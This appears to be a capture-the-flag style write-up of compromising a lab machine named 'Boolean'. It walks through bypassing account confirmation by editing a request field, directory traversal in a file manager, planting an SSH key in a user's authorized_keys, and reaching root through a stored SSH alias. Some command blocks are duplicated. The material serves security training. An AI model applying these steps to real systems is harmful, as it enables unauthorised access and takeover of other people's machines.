Nmap done: 1 IP address (1 host up) scanned in 138.27 seconds

Browse to the web application on port 80 to find the following webpage:

I see there is an option to create an account:

After creating an account successfully, it tells me to complete the registration process:

However I am able to login without confirmation:

Pressing the Edit button and intercepting the request using BurpSuite returns the following request:

I notice the confirmed part is set to false.

After some messing around, I managed to set the confirmed to true:

And after refreshing the webpage, I gained access to the internal file manager web application:

I can upload files using the web application:

After clicking on the uploaded file, it downloads on my machine. The parameters are interesting:

http://192.168.140.231/?cwd=&file=test.txt&download=true
http://192.168.140.231/?cwd=&file=test.txt&download=true

It looks like we can change the working directory, specify the name, and the download action. Backing out three directories behind, I get the following files:

The .ssh directory exists where there are SSH keys:

However, none of the SSH keys worked for me. I generated a new key to overwrite the one of user remi:

┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ ssh-keygen                  
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): remi
Enter passphrase for "remi" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in remi
Your public key has been saved in remi.pub
The key fingerprint is:
SHA256:uieYNo/Zei2YHvRVNJV+w7e/Zr66Mkpg0D2xXKAJaLM kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|    ..   o+o..   |
|   +  o =.+..    |
|  . o. + =.. .   |
|   E  .  .. . + .|
|    .  oS    . o.|
|   . ..o.      . |
|    .=o. .      .|
|    B=+.+  o   o.|
|   o==++ .. oo*+o|
+----[SHA256]-----+
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ mv remi.pub authorized_keys
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ chmod 600 authorized_keys
┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ ssh-keygen                  
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): remi
Enter passphrase for "remi" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in remi
Your public key has been saved in remi.pub
The key fingerprint is:
SHA256:uieYNo/Zei2YHvRVNJV+w7e/Zr66Mkpg0D2xXKAJaLM kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|    ..   o+o..   |
|   +  o =.+..    |

┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ mv remi.pub authorized_keys
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ chmod 600 authorized_keys

I uploaded the authorized_keys inside the .ssh directory:

Then using SSH, I gained access to the target machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ ssh remi@192.168.140.231 -i remi
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
remi@boolean:~$ 

┌──(kali㉿kali)-[~/Desktop/Labs/Boolean]
└─$ ssh remi@192.168.140.231 -i remi
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
remi@boolean:~$

There is a file called .bash_aliases that is pretty much a shortcut that allows us to connect to the machine as root:

remi@boolean:~$ cat bash_aliases
alias root='ssh -l root -i ~/.ssh/keys/root 127.0.0.1'
remi@boolean:~$ 
remi@boolean:~$ root
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22
remi@boolean:~$ cat bash_aliases
alias root='ssh -l root -i ~/.ssh/keys/root 127.0.0.1'
remi@boolean:~$ 
remi@boolean:~$ root
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22

However, as shown in the output above, using the root command does not work due to Too many authentication failures.

To overcome this, according to this article, browse to the .ssh directory and create a file called config that contains the following:

Host * 
       	IdentitiesOnly=yes
Host * 
       	IdentitiesOnly=yes

And now we are in as root:

remi@boolean:~/.ssh$ root
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@boolean:~# whoami
root
root@boolean:~# 

remi@boolean:~/.ssh$ root
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@boolean:~# whoami
root
root@boolean:~#
